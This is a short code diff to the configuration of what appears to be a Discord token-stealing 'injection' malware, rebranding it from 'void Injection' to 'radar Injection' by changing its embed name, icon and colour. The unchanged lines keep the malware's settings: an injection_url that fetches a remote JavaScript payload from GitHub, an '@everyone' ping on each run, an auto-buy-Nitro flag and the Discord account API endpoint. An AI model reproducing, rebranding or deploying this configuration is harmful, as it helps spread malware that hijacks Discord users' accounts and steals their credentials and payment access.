@@ -11,9 +11,9 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'void Injection', 
-  embed_icon: 'https://cdn.discordapp.com/attachments/1351697032091271232/1355355252026638346/119efd7cc9c945851967fd81f1578869.png?ex=67e8a071&is=67e74ef1&hm=cf4525e1f2d3e611e6fc0fc0490e0032c3d62e0fbfada9db986e8b00659b1d21&'.replace(/ /g, '%20'),
-  embed_color: 15548997, 
+  embed_name: 'radar Injection', 
+  embed_icon: 'https://media.discordapp.net/attachments/1395969452193087612/1395970955297165382/bm1fTT0.png?ex=687c62c3&is=687b1143&hm=d17ca5d5bf1aa38c944063592bd2cb790fc7aad65128a1d7a4e19e9adf8e1509&=&format=webp&quality=lossless&width=415&height=417'.replace(/ /g, '%20'),
+  embed_color: 631940, 
   injection_url: 'https://raw.githubusercontent.com/u8i9vnyhngvjyfvyjf6uy/539835689456/main/good.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
